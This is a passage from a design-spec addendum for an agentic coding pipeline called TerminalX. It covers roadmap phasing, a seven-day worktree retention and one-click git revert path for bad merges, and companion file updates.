**Why it matters.** Adoption of agentic systems inside a team eventually requires a defensible cost story. Per-run cost visibility is how you have that conversation.

---

## A21. Phasing impact

After the §0.1 promotion, the base-spec phasing absorbs A2, A5, A10, A12, A14, A24, A26 directly. The roadmap below covers only the addendum-resident items.

### Phase 2 (Live execution) — additions from addendum:
- §A3 budget enforcement (with complexity-scaled defaults).
- §A15 failure taxonomy.
- §A20 cost attribution.

### Phase 3 (Polish & power) — additions from addendum:
- §A1 scratchpad + compaction.
- §A1.1 sub-agent delegation (skill + IPC).
- §A4 plan complexity gate.
- §A6 red-team role.
- §A7 categorical confidence + escalation routing.
- §A9 diff-aware reviewer chunking.
- §A11 INVARIANTS.md integration.
- §A16 eval harness (continuous from here on).
- §A17 stage-level checkpointing (with two-factor verification).
- §A18 concurrent runs.
- §A19 tiebreaker (Sonnet-with-different-prompt).
- §A25 rollback path.

### Phase 4 (new) — pipeline as evolving artifact:
- §A13 lessons-learned loop with curation gate.
- Eval-driven skill/prompt iteration.
- Project-template marketplace (`Bug fix`, `New API endpoint`, `Schema migration`, `Security patch`).
- Lessons-learned curation UI.
- Failure-class dashboards.

---

## A25. Rollback path (post-merge revert)

**Missing.** The pipeline ships changes. What happens when those changes turn out to be bad post-merge — say, on day 3 in production?

**Change.** Two complementary mechanisms:

1. **Worktree retention.** Successfully-merged worktrees are not immediately destroyed. They remain at `.tx-worktrees/<run-id>/` for **7 days** post-merge (configurable per project). After the retention window, the controller's startup sweep deletes them. User can manually delete earlier from the "Pipeline > Stale worktrees" UI.
2. **One-click revert.** TerminalX exposes a "Revert run" command per completed run. It does **no LLM work**: it uses the `Tx-Pipeline-Run: <run-id>` trailer (§13.4) to identify all commits made by that run via `git log --grep="Tx-Pipeline-Run: <run-id>"`, then opens a revert PR using `git revert <sha>...<sha>` (or local merge if no GitHub remote). The user reviews the revert diff in the existing UI and confirms.

The revert PR's body includes a link back to the original run's failure bundle (if any) and the original PR — so the connection between "this is being reverted" and "this is what was shipped" is permanent.

**Why it matters.** Auto-shipped changes that turn out to be bad must have a fast, auditable rollback. Without it, automation creates risk that humans cannot quickly contain.

---

## A22. What this collectively changes

The base spec ships an **agentic pipeline**. This addendum ships an **agentic pipeline platform** — the difference being:

- **Trust:** capability scoping, INVARIANTS.md, fingerprinting, evals, red-team, audit-grade telemetry.
- **Calibration:** complexity gate, confidence scores, clarification sentinel, tiebreaker.
- **Operability:** budgets, heartbeats, stuck detection, notifications, failure taxonomy, cost attribution.
- **Evolution:** lessons learned, eval harness, fingerprint diffing.

Anthropic's published agentic patterns ("Building Effective Agents," the multi-agent research system writeup, the skills system) all converge on the same load-bearing properties: bounded context, scoped capability, honest failure, persistent learning, measurable outcomes. The base spec is strong on the first two; this addendum closes the latter three.

---

## A23. Companion edits (extends §17)

When this addendum lands, additionally update:

- `CLAUDE.md` — add sections for capability manifests, INVARIANTS.md convention, the `evals/` directory, lessons-learned directory.
- New `INVARIANTS.md.template` shipped at `src-tauri/resources/templates/`.
- `pricing.json` shipped at `src-tauri/resources/pricing.json` with each supported model's input/output rates.
- New skills under `src-tauri/resources/skills/`: `tx-pipeline-subagent`, `tx-pipeline-red-team` (phase 3).
- `evals/` directory with first 5 fixtures committed in phase 2 ship gate.
- `.gitignore` recommendation extended: `.terminalx/lessons-learned/` is **committed** (versioned with the project); only `.terminalx/pipeline-telemetry/` and `.terminalx/failure-bundles/` are ignored.
